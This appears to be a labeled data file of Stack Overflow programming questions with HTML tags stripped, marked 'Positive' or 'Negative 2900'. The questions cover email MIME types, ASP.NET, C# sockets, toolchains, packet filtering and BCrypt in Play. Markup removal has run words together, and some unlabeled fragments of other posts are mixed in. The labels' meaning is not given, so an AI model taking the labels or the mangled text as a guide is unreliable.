But looks like its wrong, must be something like codesmtp.mydomain.comcode and codepop.mydomain.comcode.p  pSo it works for now, but how can I configure my Droplet to work with mail subdomains and close possibility to use directly codemydomain.comcodep
Positive 2900 pI have started a new domain for a client, and made sure everything works well, however it still has to resolve.  I was Setting nameservers from clients server to our own. p  pBut the client already wanted to send emails. So I have made him a few using DirectAdmin. Although they dont work yet and I get the standard 550 error. And so I was thinking this probably has something to do with either the domain or mail not being resolved yet.p  pSo I was wondering what the standard resolve time is for mailboxes or does this entirly depend on the domainname resolve time I could not find anything via the DA documentation. Any tips or help would be greatly appriciated. p

Positive 2900 pAs I understand email can contain only one main codeContentTypecode header, is it correct  Whether you want to send message with files attached to it, or message with html content along with plain text version you should use strongMultipart ContentTypestrong. And within each part one can also explicitly specify contenttype for that particular part.p  pFrom a hrefhttpwww.w3.orgProtocolsrfc134172Multipart.html relnofollowrfc1341a I gathered that that there are two main subtypes of multipart contenttypep  ul liThe Multipartmixed primary subtypeli liThe Multipartalternative subtypeli ul  pIf I would want to include both html and plain text versions I would use strongMultipartalternativestrong as upper outermost codeContentTypecode header since its semantical meaning, which is from a hrefhttpwww.w3.orgProtocolsrfc134172Multipart.html relnofollowrfc1341ap  blockquote   pIn particular, each of the parts is an alternative version of the same information. User agents should recognize that the content of the various parts are interchangeable. The user agent should either choose the best type based on the users environment and preferences, or offer the user the available alternatives. In general, choosing the best type means displaying only the LAST part that can be displayed. This may be used, for example, to send mail in a fancy text format in such a way that it can easily be displayed anywherep blockquote  pOn the other hand, if I need to attach files I should use strongThe Multipartmixedstrong  as stated  in a hrefhttpwww.w3.orgProtocolsrfc134172Multipart.html relnofollowrfc1341ap  blockquote   pMixed is intended for use when the body parts are independent and intended to be displayed seriallyp blockquote  pwhich is obviously the case when you want to attach files.p  pBut how do I send email with files strongANDstrong with text version i.e. when I want some parts of my multipart letter to show serially main content and attachments, while other parts to show interchangeably html and plain text What outermost codeContentTypecode header should I use thenp

Negative 2900 pFor an application  Im developing I need a mixture of dynamically generated and static pages.

You enter one of the function names from a stack trace in your recent dump into the wiki search box and you retrieve the saved info about the previous occurrence.p  pUpdate thanks for all the answers.

Negative 2900 pWhen writing Cocoa apps, I do the majority of the user interface layout programmatically. For examplep  precodeNSRect popUpFrame  NSMakeRect10, 10, 100, kDefaultPopUpButtonHeight NSPopUpButton  popUp  [[NSPopUpButton alloc] initWithFramepopUpFrame] ... codepre  pMy question is about that codekDefaultPopUpButtonHeightcode constant. I currently maintain a source file full of such constants, and I fill in the proper sizes manually. I am able to determine the correct sizes by dropping a new control into a blank view in Interface Builder and then checking its properties to see what size IB gives it.p  pThere must be a better way. Is it possible to access these values at runtime Ideally, I would expect every codeNSControlcode to have a class method something like codeNSSizedefaultSizecode, or, for controls like codeNSButtoncode that have different default sizes depending on the particular button style used, something like codeNSSizedefaultSizeForButtonStyleNSButtonStylebuttonStylecode.p  pa hrefhttpdeveloper.apple.comdocumentationUserExperienceConceptualAppleHIGuidelinesXHIGIntroXHIGIntro.html relnofollowApples Human Interface Guidelinesa has information about control layout and the spacing embetweenem controls, but it doesnt say anything about the proper sizes for individual controls.p

That allows me to reuse the same frontend code.p  pI suppose I could do this with an ajax call instead and just have it rerender the component on the front end, but it would be nice to have the option to do it either way and to understand how to architect Rails a bit better in the process.p  pIt seems like there should be a render option from within the cells framework to render to a certain controller or view, but its not working like I expect and I dont know if Im even in the ballpark.p  pThanksp

And at that point, I figure that anything that works for WinForms would be trivial to modify for WPF.p  pI can think of several ways to do this, but its not clear which is simplest.p  pWhats the strongsimplest waystrong to implement this remove metacharacters if single, dedouble if doubledp  pstrongUpdatestrong I had assumed that WinForms and WPF both handled these basically the same, but it turns out they dont. WinForms will strip a lone metacharacter at the end of the string codeFooampcode becomes codeFoocode, but WPF will not codeFoocode remains codeFoocode. Bonus points for an answer that addresses both.p

Negative 2900 pOK, this feels like a question that should be easy to answer, but as with so much mixing of asp.net and jQuery, its a bit of a nightmare.p  pWhat I want to do is be fading a codedivcode in and out at various times during the clients viewing of my asp.net page I fade it out using jQuerys codefadeTocode before triggering an UpdatePanel update to indicate that the data there is not fresh and I want to fade it in again once the UpdatePanel has been updated.  Ive gotten as far as updating the UpdatePanel in the codebehind, and this results in the codedivcodes content changing... but how do I fade the codedivcode back in againp  pThe way I see it, there are 2 ways register an event handler on page load to detect when the codedivcodes content has been changed and fade it back in, or call a function from the asp.net codebehind when Ive updated the codedivcode to fade it back in.p  pIn the first case, there doesnt seem to be emanyem event triggered by the codedivcodes content changing, so I cant seem to do that.  If anyone knows how I could get a client event to trigger when I update the codedivcode, that would be a nice solution.p  pIn the second case, I thought that this was what codeClientScriptManagercode was for, but it doesnt quite do what I want.  I want to be able to register a particular Javascript function with codeClientScriptManagercode and then tell codeClientScriptManagercode to execute it in the client, from my codebehind.  You cant seem to do that.  codeClientScriptManager.RegisterClientScriptBlockcode simply inserts some codeltscriptgtcode into the HTML output, rather than calling a function.  Presumably this would work if I kept registering things likep  precodeltscriptgtfadeBackInltscriptgt codepre  pbecause the Javascript would be immediately evaluated and run, but this feels messy, and that feeling is intensified by the fact that Id have to keep randomly generating a new unique value for the codekeycode argument of codeClientScriptManager.RegisterClientScriptBlockcode, because its specifically designed to emstopem this kind of repeated code.  However, Im struggling to see an alternative.  Can anyone come up with a good idea as to a better mechanism to get this to workp  pId really like something along the lines ofp  precodeClientScriptManager.RegisterClientScriptFunctionfadeBackIn, function fadeBackIn ...   [...]  ClientScriptManager.ExecuteClientScriptFunctionfadeBackIn codepre  pbut I dont see that functionality available.  p
Negative 2900 pWe have an Elmah configured to send error notification emails to us whenever something is wrong. It all worked great for a while but were noticing that sometimes Elmah would just stop sending error notifications, but still logs the error as XML.p  pSo to verify, we have a test page which generates uncaught 500 server error. If we did an IIS reset and try the page, Elmah would correctly logs and send the notification error. However after a while were still unsure of how long or when it stopped working. Elmah would only log the file without sending email notifications.p  pSo far we have ruled out SMTP server not sending Elmah notifications because when we trigger the 500 server error while Elmah is in a bad state, theres no entry in SMTP server log at all.p  pIn summary, the symptoms are as followsp  ol liWhen Elmah is in a bad state, itll stop generating Email notification but continue logging error in XML file.li liAfter IIS Reset, everything goes back to normal. Though we do have scheduled app recycle everyday, but that doesnt seem to help in this situation.li liThe bad state seems to be triggered by whenever we overridethe existing binary to a newer release without restarting IIS. However, the 500 server error test indicates that Elmah sometimes goes into bad state, sometimes dont.li ol  pIs anyone observing similar symptomsp

Negative 2900 pI am working with Magento bundle products that contain hidden bundle options that need to have the quantity updated programmatically. A problem arises when the bundle quantity is edited from the shopping cart. I have a button set up to submit the bundle quote item to an updateLineItemAction method in my own CartController to handle the update of the hidden bundle option.p  pThe updateLineItemAction method locates the hidden bundle option and assigns the updated quantity to the selectionqtyX and productqtyX properties, where X is the ID of the bundle option. Values in the infobuyRequest are also updated. After saving the quote item, theres a redirect to the cart to show the updated cart values.p  pThe updated quantity is displayed correctly in the cart, and the hidden bundle option has the correct quantity assigned. The problem is that the bundle item price has not updated to reflect the updated quantity on the hidden bundle option. I did something similar to this in Magento 1.1.x and it worked fine. Doing this now in 1.4.1.2, the price is not automatically updated when the quote item is saved. Ive tried saving the quote and the cart again after updating the item, but that doesnt seem to have any effect. p  pWhat is the proper way to recalculate the price for a quote item when subitems have had the quantity changed Is there a better way to change the quantity of a quote item bundle option so that the price of the bundle item is updated correctlyp

Negative 2900 pIm writing a clientserver application in C, and its going great. For now, everything works and its all pretty robust. My problem is that I run into some delays when sending packets across the connection.p  pOn the client side Im doing thisp  precodeNetworkStream ns  tcpClient.GetStream   Send packet  byte[] sizePacket  BitConverter.GetBytesrequest.Length byte[] requestWithHeader  new byte[sizePacket.Length  request.Length] sizePacket.CopyTorequestWithHeader, 0 request.CopyTorequestWithHeader, sizePacket.Length  ns.WriterequestWithHeader, 0, requestWithHeader.Length   Receive response  ns.ReadsizePacket, 0, sizePacket.Length int responseLength  BitConverter.ToInt32sizePacket, 0 byte[] response  new byte[responseLength]  int bytesReceived  0 while bytesReceived lt responseLength    int bytesRead  ns.Readresponse, bytesReceived, responseLength  bytesReceived   bytesReceived  bytesRead  codepre  pLeft out some exception catching etc. The server does the opposite, i.e. it blocks on NetworkStream.Read until it has a whole request, then processes it and sends a response using Write.p  pThe raw speed of WriteRead isnt a problem i.e. sending large packets is fast, but sending several small packets, one after another, without closing the connection, can be terribly slow delays of 50100 ms. Whats strange is that these delays show up on LAN connections with typical ping times lt1 ms, but they do not occur if the server is running on localhost, even though the ping time would effectively be the same at least the difference should not be on the order of 100 ms. That would make sense to me if I were reopening the connection on every packet, causing lots of handshaking, but Im not. Its just as if the server going into a wait state throws it out of sync with the client, and then it stumbles a bit as it reestablishes what is essentially a lost connection.p  pSo, am I doing it wrong Is there a way to keep the connection between TcpServer and TcpClient synchronised so the server is always ready to receive data And vice versa sometimes processing the request from the client takes a few ms, and then the client doesnt seem to be ready to receive the response from the server until its had a few moments to wake up after blocking on Read.p

Please see the documentation at   ltURLhttphttpd.apache.orgdocs2.2vhostsgt  for further details before you try to setup virtual hosts.

Negative 2900 pPlease guide me through the strongsteps required to build a basic toolchainstrong sufficient to build a bootable linux image and strongdiscuss why things should be done the way you suggeststrong.p  pPointers to strongexisting documentationstrong is also very much appreciated. I have looked into Linux from Scratch and have some experience building Gentoo images using the distribution specific tools.  I have also looked at the documentation of various tools used to build crosscompiling toolchains for embedded devices.p  pHowever the documentation of these tools only discuss compiling toolchains actually using these tools not how they do it, and why not differently.  Often the these resources also mention that other tools do it differently and of course worse, so I get a feeling simply reading the source will only help me learn how the given build tool works rather than provide insight into the actual process and its possible variation.p  pSo I am not much interested in discussions about tools to automate building a toolchain but instead in strongcommented instructions on how to do it manuallystrong.  Also note that for now I plan to build and run the image on the same machine so I do not need to crosscompile.  But I am still interested in discussions about crosscompiling, but the focus should probably be elsewhere. What else is needed on and to build a bootable image is not part of this question  just building the toolchain to get there it is.p  pemTo help you understand where I stand here are some questions I have and some things I believe to know I understand that even when building natively it is important to separate the toolchain used to build the image from that of the host to avoid linking to libraries which might not be available later other reasons.  I dont know whether it is sufficient to adjust environment variables accordingly which or if it is best to build a toolchain, chroot and the rebuild what do I gain from rebuilding. What could go wrong if doing the former I have read that building gcc twice using the first to build the second is overkill since its build system does this anyway.  If so what differences in the two builds can it detect, why do they matter  Has necessarily something gone wrong if the two builds differ and what is done about it if they do.  Does crosscompiling when done properly result in exactly the same binaries as when done natively And if not, why is that not so bad after all and many projects choose that way neverthelessemp

The user can control which columns should be displayed in the table.  Sometimes, if the user chooses many columns, the content can spill off the width of the screen.  Much of the time, the table is smaller than the width of the screen and Id like it centered.  Without addressing centering, the above layout works just fine for tables which spill off the screen.  E.g. scrolling in both directions works.  However, when I do thisp  precodeFrameLayout.LayoutParams lp        new FrameLayout.LayoutParamsLayoutParams.WRAPCONTENT,                    LayoutParams.WRAPCONTENT, Gravity.CENTER theTable.setLayoutParamslp codepre  pit starts behaving oddly.  For times when the content is smaller than the width of the screen, it properly centers it.  However, when the content is wider than the screen, the content is centered forcing some of the left hand side of the table to disappear off the left hand side of the screen.  E.g.p  precode    SSSSSS     SSSSSS   TTTTTTTTTT     SSSSSS     SSSSSS codepre  pWhere S is the screen and T is the table.  Its also impossible to scroll left to see the cut off content but scrolling right works.  What Im looking forp  pIf the table is smaller than the width of the screen, then center it. If the table is wider than the width of the screen, then left align it with horizontal scrolling.p  pAny ideas on how to achieve thisp

Negative 2900 pbr In a given isa  lets say x86 or arm  is there any way to figure out that the particular instruction is privilege or sensitive br We can see the documentation and can conclude this, but by using assembly instruction is this possible to figure out this  br Edit  Moreover documents of all the isa doesnt specify whether the instruction is sensitive like arm  though x86 clearly specifies this. So there should be way to figure this out.p

When I click the accordion headings to expand the different sections, the elements above the accordion lose their padding for the duration of the animation.  The result is that these elements shift to the left for the duration of the animation.

Negative 2900 pBecause anything from C and beyond have nice constructs that handles a stack like  behaviorvectors, lists, array lists, etc, I want to keep the question in terms of C.p  pSo, I am learning about compilers, stacks, inscript and postscript, parsers, lexers, and everything else that involves putting a compiler together as I will be required to later on in the my course for this semester.  I want to make sure that my understanding of stacks is solid.p  pI believe I have the general idea on how one is put together.  Basically you have an array following LIFO model.  When you add an element, it is pushed in on the end of the array and popped off when removed.  No issue there.  My concern comes whith some the implementation detail.  strongHow are things like number of elements tracked  How large should a stack be initialized to Should I use a structure to hold those details together  Are variables globalstrongp  pMy professor has already handed us some source code in relation to our assignment, strongI am just looking for some supplemental details for my own understandingstrong generally I have to put something together myself before getting an understanding of someone elses code. In most of my programming experience, the stack was some magical place that was beyond my control, but would explode if my recursive functions got too deep SO anyone.p  pThanks in advance.p  pstrongEDITstrongp  pOk, one thing I think I need to clarify is that I am not making a true stack, but will be required to take a an infix epxression and convert it to postfix.  I am looking at the strongstack data structurestrong so anything architecure related may not apply in this since.

Negative 2900 pI created a readonly shortcut to a workbook that is writeable. Doing this, I can simultaneously open separate readonly and writeable instances of the same workbook when I manually click the shortcut and the actual document separately. However I cant seem to duplicate this in VBA code. Trying to open the same workbook from the readonly instance using VBA code closes the readonly instance and leaves me with only the writeable one, EG p  precodeWorkbook.Open filenameActiveWorkbook.FullName, editableTrue codepre  pRunning this from the readonly instance terminates the instance and replaces it with a writeable one. Id like to be able to have both, but no idea how to do this Reason is I want to be able to publish changes made in readonly instance to writeable one with user only needing write access to the writeable instance for a few seconds, enough time for the VBA code to open it, publish the changes, and quickly save and exit and reactivate readonly instance. This allows multiple people in a team to almost concurrently make changes to the same workbook without having to suffer the limitations of Share Workbook, while also simultaneously being able to view the document. p  pBut what if someone makes changes in between Well, the user is told to reload the readonly instance if any changes have been made by someone else since the user opened the document, which just calls the above code where editable  false.p  pHelp greatly appreciatedp

Negative 2900 pI have a site where I allow some users to proxy in as an other user. When they do, they should see the entire site as if they where the user they proxy in as. I do this by changing the current user object p  precodeinternal static void SetProxyUserint userID      HttpContext.Current.User  GetGenericPrincipaluserID  codepre  pThis code works fine for me.p  pOn the site, to proxy in, the user selects a value in a dropdown that I render in my layout file as such, so that it appears on all pages.p  precode Html.ActionSetProxyUsers, Home codepre  pThe SetProxyUsers view looks like this p  precodeusing Html.BeginFormSetProxyUsers, Home   Html.DropDownListddlProxyUser, SelectListViewBag.ProxyUsersSelectList, new  onchange  this.form.submit  codepre  pp  pThe controller actions for this looks like thisp  precode    [HttpGet]     public ActionResult SetProxyUsers              ViewBag.ProxyUsersSelectList  GetAvailableProxyUsersoriginalUserID          return PartialView           [HttpPost]     public ActionResult SetProxyUsersFormCollection formCollection              int id  int.ParseformCollection[ddlProxyUser]          RolesHelper.SetProxyUserid          ViewBag.ProxyUsersSelectList  GetAvailableProxyUsersoriginalUserID          return RedirectRequest.UrlReferrer.ToString      codepre  pAll this works except for the originalUserID variable, which I put in here to symbolize what I want done next.p  pMy problem is that the values in the dropdown list are based on the logged in user. So, when I change user using the proxy, I also change the values in the proxy dropdown list to either disappear if the new user isnt allowed to proxy, or to show the new users list of available proxy users.p  pI need to have this selectlist stay unchanged. How do I go about storing the id of the original user I could store it in a session variable, but I dont want to mess with potential time out issues, so thats a last resort. p  pPlease help, and let me know if there is anything unclear with the question.p  pstrongUpdatestrongp  pI didnt realize that the codeHttpContextcode is set for each post. I havent really worked with this kind of stuff before and for some reason assumed I was setting the values for the entire session stupid, I know.  However, Im using windows authentication. How can I change the user on a more permanent basis as long as the browser is open I assume I cant use FormAuthentication cookies since Im using windows as my authentication mode, rightp

Negative 2900 pI have a situation, dont know if my approach is right or not please guide me through this. Suppose I have a Panel control containing numerous controls in it, During runtime I performed an iteration over each control in that panel by using codePanel1.Controlscode property, Now in those controls they could be anything codeTextBoxcode, codeButtoncode, codeDropDowncode etc. Now I want to find during runtime, which Controls is of which type and after that find if any specific property is contained in that control or not amp if that property exists there than set the value of that property. I think I would have to do some thing using codeReflectioncode here but dont know from where to start.p  psample codep  precode foreach Control cntrl in Panel1.Controls                       find type of the control              find any specific propertys existence in that control              if property exists than set value of that property          codepre  pAny other more relevant approach is welcomed too, for performing this task in runtime. p  pSorry I forgot to mention I dont want to use codeiscode keyword here because controls are of may types, and I want to create a global function which can be used for any panel with out knowing the types of controls present in that panel.p  pThankx in advance.p
Negative 2900 pI have a directory full of JPEGs. I want to convert every one of them to PNGs of the same name. I tried codeconvert .jpg .pngcode but I just ended up with a bunch of PNGs with names em0.png, em1.png, etc.p  pIs there a way to preserve the name of the files when iterating through the entire directory p  pAny help is much appreciated. Thanksp
Negative 2900 pI have a Samsung Galaxy Tab, Android version 3.2, that is displaying the default Button control much much darker. Android 3.2 doesnt do this in the emulator, it doesnt do it on a newer ICS tablet, it doesnt do it on any of our phones or in any version of the Android emulator. Has anyone encountered this We are not doing emanythingem to the button controls display wise. They are completely out of the box controls.  Is there a fix that doesnt require custom coloring all our button controls Were kind of stuck, because we cant reproduce it anywhere but the tablet its happening on is our final QA approver, and shes a stickler for this sort of thing its an enterprise app were trying to get going.p  pEdit Looks for sure like its setting a transparency on the buttons that none of the other devices are, rather than using a different color. p  pEdit Here is a screen shot.

Negative 2900 pIve got a button that Ive modified its template so it shows different background colour when the button gets clicked and mouseover it goes green rather than light blue.p  pThat works great by itself but I need to change the background colour according to some some state so I need to change the background in the code.p  pMy problem is when I change the background colour in the code, it changes correctly but its no longer changing background for click or mouseover events.p  pIm assuming that I somehow overwritten the background colour in the code so what I created in the template is covered.

Then I was hoping to convert those encoded parts back into the real symbols before I insert to a SQL database.p  pIve tried a function such asp  precodePublic Function DecodeByVal s As String As String     Dim uni As New UnicodeEncoding     Dim encodedBytes As Byte  uni.GetBytess     Dim output As String        output  uni.GetStringencodedBytes      Return output End Function codepre  pWhich was based on the examples on the MSDN at a hrefhttpmsdn.microsoft.comenuslibrarysystem.text.unicodeencoding.aspx relnofollowhttpmsdn.microsoft.comenuslibrarysystem.text.unicodeencoding.aspxap  pIt could be that I have a complete misunderstanding of how this works in VB.net. In C I can simply use escaped characters such as u20AC. But no such thing exists in VB.net.p

Negative 2900 pThe documentation about a hrefhttpmsdn.microsoft.comenuslibrarysystem.threading.timer28vvs.10029.aspx relnofollowcodeSystem.Threading.Timercodea class states thatp  blockquote   pemNote that callbacks can occur after the Dispose method overload has been called, because the timer queues callbacks for execution by   thread pool threads.emp blockquote  pThis means that all the callbacks scheduled before calling the codeDisposecode method must be completed. But how are callbacks scheduled When is the next callback scheduledp  pSuppose we create a new instance of the codeTimercode class with a finite period equal to emPem and a finite due time equal to emDem. The first execution of the callback will occur after emDem milliseconds have elapsed. Subsequent callbacks will be executed after emPem milliseconds from the start of the previous callback. Writing a code sample, you will see that if the callback execution time is greater than the specified period emPem, the timer queues callbacks.p  pSuppose that the callback should back up some data on file the callback execution time is the backup execution time and depends on the amount of data that must be written to file, so the callback execution time may exceed the specified period. In this case it is more appropriate to schedule the next backup at the end of the current backup for this purpose it is sufficient to disable the periodic behavior by setting the period to codeTimeout.Infinitecode and to call the codeChangecode method at the end of the callback, as in the following sample code.p  precode some private fields private readonly object syncRootForTimer  new object private Timer backupTimer  new TimerBackupCallback, null, 10000, Timeout.Infinite private bool isTimerDisposed  false   it performs timer shutdown public void Shutdown      WaitHandle disposed  AutoResetEventfalse     locksyncRootForTimer              backupTimer.Disposedisposed         isTimerDisposed  true          WaitHandle.WaitAllnew WaitHandle[] disposed       ...   private void BackupCallbackobject state       It performs the backup procedure...      ...      locksyncRootForTimer              if isTimerDisposed             backupTimer.Change10000, Timeout.Infinite       codepre  pIn this way, it seems that no callback is queued. I also noticed that invoking the codeDisposeWaitHandlecode method immediately after the last schedule that is after the last call to the codeChangecode method, this last schedule is not even executed and the timer is immediately disposed.p  pI think I can say that disabling the periodic behavior and changing the due time at the end of callback execution, the timer queues no callback. This should ensure that no callbacks can occur after the codeDisposecode method has been called. Is my guess correctp

Negative 2900 pabout a year ago I set set up a solution consisting of an ASP.Net MVC 3 now presentation layer, application layer, domain layer and infrastructure layer crosscutting stuff and data.  I decided to keep the domain model in a separate project from the domain logic and use a relaxed approach to the presentation layer by passing the domain entities instead of DTOs since we really only have 1 front end right now.  p  pWe are going to be servicing a distributed layer soon, in addition to our main website and I will use DTOs there, but I am considering using DTOs in the main website also.  I am also wondering if I should bother to break out the framework code in the domain layer IRepository, IUnitOfWork, EntityValue object supertypes etc.  Well here, let me list out the questions I need feedback onp  p1 I was pretty diligent about not having an anemic domain model and also watched out for behavior that was specific to the presentation concerns.  Most of the business calculations that are needed are on the domain entities, is it ok for the presentation layer to call this behavior directly or should it instead call an application service that then calls the domain entities  This would suggest to me that there is no reason to have the presentation layer know about the domain entities and instead could use DTOs.  Alternatively, I could have the DTOs expose these behaviors, but then I feel like I am robbing the domain entities.  So I guess that is 3 options Rich domain objects called directly, service layer or dto with behavior which is bestp  p2 Right now I have a domain project, which has domain services, specifications and logic and is orchestrated by the application layer and separate project for the domain model used by presentation layer and application layer.  I also have framework interfaces for generic repository and unit of work pattern here.  Should I break the framework stuff out into a separate project and combine the rest into one projectp  p3 I want to reorganize my domain layer into aggregates, right now all of the domain model is organized by modules, basically all the types for each module are in one namespace.  Would it be better to organize the entities, value objects, services and other stuff by the aggregatesp  p4 Should I use the Separated Interface pattern for infrastructure services that are basically .net framework helper library types  For example configuration objects or validation runners  What is the benefit there in doing sop  p5 Lastly, not many examples I have seen have used interfaces for domain entities.  Almost every object I have I prefer to pass around interfaces for dependency reasons and it makes testing much easier.  Is it valid to use interfaces instead of concretes  I should mention that we use EF 4.3.1 soon to upgrade to latest version and I seem to remember that EF had a problem with using interfaces or something.  Should I be exposing interfaces instead of the domain entitiesp  pThank you very much in advance.p  pProject Structurep  pre Presentation.Web                       Application                  Domain.Model  Domain  Infrastructure.Data, Infrastructure.Core, Infrastructure.Security pre  pExplanation Presentation.Web MVC3 Web Projectp  pApplication    Service Layer that orchestrates the domain layer and responds to requests from the presentation layer get this update that.  This is organized by module, for example if I had a customer module I would have Application.Customer and in that would be all of the application servicesp  pDomain   Contains domain services, specifications, calculations and other domain logic that is not exposed as behavior on domain entities.  For example a calculation that involves several domain entities exposed as a domain service for the application layer to call.   Also contains framework code for a specification framework and the main interfaces for a generic repository and unit of work pattern.p  pDomain.Model   Contains the domain entities and enumerations.  Organized by module.  For example, if I might have a customer module which has a customer entity, customerorder entity etc. This is broken out away from the domain project so that the objects can be used by the application and presenation layer.p  pInfrastructure.Security   Security infrastructure for authentication and authorizationp  pInfrastructure.Core   Crosscutting stuff used by multiple layers validators, logging, configuration, extensions, IoC, email etc...  Most of the projects depend on interfaces in this project except domain.model for infrastructure services.p  pInfrastructure.Data   Repository Implementations via LINQ and EF 4.3.1, mapping layer, Unit of Work implementation.  Interfaces are in Domain project separated interfaces patternp

Negative 2900 pI am looking into the possibility of filtering incoming UDP traffic based on IP addresses on a Linux machine, discarding packets completely that match any of the filter addresses. The set of IP addresses I am interested in is dynamically and frequently changing and is not known a priori. Packets that are deemed to be discarded should skip all further processing. I can grant CAPNETRAW capability to the process but do not want to write my own driver or modify the kernel.p  h2Background informationh2  pA practical approach I am using for compactly representing a large set of IP addresses is a Bloom filter. This approach is already used by a dynamic packet filtering approach implemented as a device driverp  pa hrefhttpluca.ntop.orgBlooms.pdfhttpluca.ntop.orgBlooms.pdfap  pHowever, I have userlevel code and have no means to tweak the kernel or write a device driver of my own.p  pSimilarly, I do already have a solution that sniffs packets based on IP addresses in an efficient manner based on a PFPACKET socket and an RXRING, as is done in netsniffngp  pa hrefhttpnetsniffng.orghttpnetsniffng.orgap  pMy approach is the extension of the capture mechanism in netsniff or tcpdump or Wireshark extended with the Bloom filter principle to get more compact Berkeley Packet Filter BPF programs. This works excellently but with the side effect that even if the filter discards the packet and thus it does not appear in RXRING, it still continues its journey in the kernel. Eventually, given there are no open sockets for much of the filtered traffic which is mostly synthesized, as if by netsniffs trafgen received, ICMP codedestinationunreachablecode messages are generated.p  pThe question, formulated in a different way is whether there is a CC approach to selectively discard traffic based on custom code e.g. with a Bloom filter in an early stage of network stack processingp  pI have looked at approaches based on iptables but managing firewall rules via iptablesrestore seems far too cumbersome for the scenario. Also, the addresses are not contiguous sets of IP addresses and would thus lead to a long list of separate addresses to test against.p  pEfficiency is a critical aspect due to the high volume of traffic involved.p
Negative 2900 pIm just starting out with clojure and Im doing a project for fun. In the below function Im just trying to display some blog posts with some options.

When running the previous MIN query with all columns, I get the same problem as before.p  pI was trying to setup something in the WHERE clause that compared the combination of two columns, but I read that that cannot be done. So, I am at a lost on how to solve this issue where there is a candidate key but the information in the records for the duplicates on this candidate key column are different. What I want to have done is what Excel 2007s Remove Duplicates procedure does where duplicates on one column can be removed and retain others.p

Negative 2900 pI have a crypto USB device which is used to store PKI certificates including the private key.  It can be readwritten to using the Microsoft Crypto APIs. And it is protected by a PIN. I am investigating if the device is in fact secure.p  pIn my opinion, the security of the device hinges on how the PIN is usedstored. This is related to a different question I posted on crypto.stackexchange  a hrefhttpcrypto.stackexchange.comquestions5929cryptousbdeviceswhereisthepinpasswordstoredhttpcrypto.stackexchange.comquestions5929cryptousbdeviceswhereisthepinpasswordstoredap  pWhen I insert the device into my USB slot, it presents itself as a CD drive containing a setup program which installs the driverCSP middlewareUI for the device. After the setup program is run and I store certificates in the device, I still see only the setup program in Windows Explorer when I look at the drive assigned for the device.p  pSo in order to prove that the device is secure or not secure, I want to access the raw data on the device. And I want to know what APIs on Windows, I can use to access the device bypassing the Crypto APIs.p  pAlternately are there tools to do the samep

Negative 2900 pI have business objects that are stored across two data storages. A part of the object is stored in Azure Table Storage and the other part in Azure SQL. Basically the SQL part is used in queries while the Table Storage is used for properties that take a lot of space.p  pMost of the times, only the SQL part of the object is used in SQL queries. The Table Storage properties are only needed when someone explicitly asks for that object. What I am trying to achieve is a design that will hide the fact that there are two data sources behind the business object, lazy load the Storage Table properties since they are not needed when performing SQL queries and still make the code testable.p  pMy current design has some POCOs that are created by a unit of work. I dont want to create two POCOs, one for Table Storage and one for SQL, so I was thinking about the following designp  precodeMake the properties virtual public class Customer      public virtual string Name getset Stored in SQL     public virtual string Age getset Stored in SQL     public virtual string Details getset  This prop is stored in Table Storage   Create a derived internal POCO that can notify when a property is asked internal class CustomerWithMultipleStorage      public event EventHandler OnDetailsGet      public override string Details               get  if OnDetailsGetnull OnDetailsGet ...   rest of the code            set   code         codepre  pAll my data layer code will work with codeCustomerWithMultipleStoragecode while all the external code, outside the DL, will use codeCustomercode and the events will not be exposed. Now, when the unit of work returns a codeCustomercode, it will load only the SQL properties and subscribe to the Get events. If someone using the Customer needs the rest of the properties, the event will be triggered and the Table Storage properties will be loaded.p  pWhat do you think about this design Is it the correct approach Do you know of a better way of doing thisp

Negative 2900 pI have a program with a function which takes a pointer as arg, and a main.

Negative 2900 pIm trying to write a Scala compiler plugin that will allow extremely general code generation something like the generality of the C preprocessor, but a bit more typesafe Im not sure if this is a terrible idea, but its a fun exercise. My ideal use case looks something like thisp  pre classlangscala prettyprintoverridecode User code. This represents some function that might take some args  and outputs an abstract syntax tree. def createFooTree... scala.reflect.runtime.universe.Tree  ...   Later user code maybe separate compilation. Here the user generates  code programmatically using the function call to createFooTree and inserts  the code using insertTree. insertTreecreateFooTree... codepre  pThe important plugin code might look like this based on a hrefhttpsgist.github.comochafik4978627thisap  pre classlangscala prettyprintoverridecodeclass InsertTreeComponentval global Global   extends PluginComponent   with TypingTransformers    import global.   import definitions.    override val phaseName  insertTree    override val runsRightAfter  Someparser   override val runsAfter  runsRightAfter.toList   override val runsBefore  List[String]typer    def newPhaseprev Phase StdPhase  new StdPhaseprev      def applyunit CompilationUnit        val onTransformer  new TypingTransformerunit          override def transformtree Tree Tree  tree match            case orig  Apply             function,              treeClosure is the closure we passed, which should              evaluate to a Tree albeit a runtime Tree.              The function.toString bit matches anything that looks like a              function call with a function called insertTree.             treeClosure if function.toString  insertTree gt               This function evaluates and returns the Tree, inserting it              into the call site as automaticallygenerated code.              Unfortunately, the following line isnt valid.             evaltreeClosure Tree                 ... codepre  pAny idea how to do this Please dont say just use macros at least in 2.10, they arent general enough.p  pBTW, I see two problems with the approach Ive outlined 1 The compiler plugin takes an AST, not a closure. It would need some way of creating the closure, probably adding a build dependency on the user code. 2 The user doesnt have access to scala.reflect.internal.Trees.Tree, only scala.reflect.runtime.universe.Tree, so the plugin would need to translate between the two.p

Negative 2900 pIm trying to implement login functionality using the play 2.1 framework. At first i just used plaintext storing of passwords for which all tests succeeded, so now Ive written an enhancement using the JBcrypt library. My code should be correct also according to the principles used in a hrefhttpsgithub.comyesnaultPlay20StartApptreemasterapp relnofollowhttpsgithub.comyesnaultPlay20StartApptreemasterappa. Now however, when i try to run the same login testcases, they fail. BCrypt gives an invalid salt version error. Ive been searching why, but i think i found the problem. To have some initial test data before executing the test I load a testdata.yml file with some users defined asp  precode models.Person     ID 123     lastName  Tom      firstName  Tom     password   secret codepre  pIn my Person class constructor, password is hashed using the Bcrypt hashpw method and then the hashed password is stored in the user object. The problem however now is at least thats what i think that the yaml parser  doesnt use my constructor but just creates an empty Person object, and manually fills in its values. So the password isnt hashed and has value secret. So then when i try to test the login functionality and use BCrypt.checkpw, it compares secret to secret instead of secret to bcryptsalthashedpassword and thats why it gives an error salt version invalid, because secret has not the required salt form etc.p  pSo my question is Is it possible to call a method in a ymlfile  For examplep  precode models.Person     bebrasID   123     lastName   Tom     firstName  Tom     password   BCrypt.hashpwsecret, BCrypt.gensalt codepre  pOr is there some way I can force yml to use my constructor instead of manually filling the values  So actually, i just need a method using my data ymlfile to use BCrypt on a plaintext password before yaml stores it in the Person object Is this possiblep

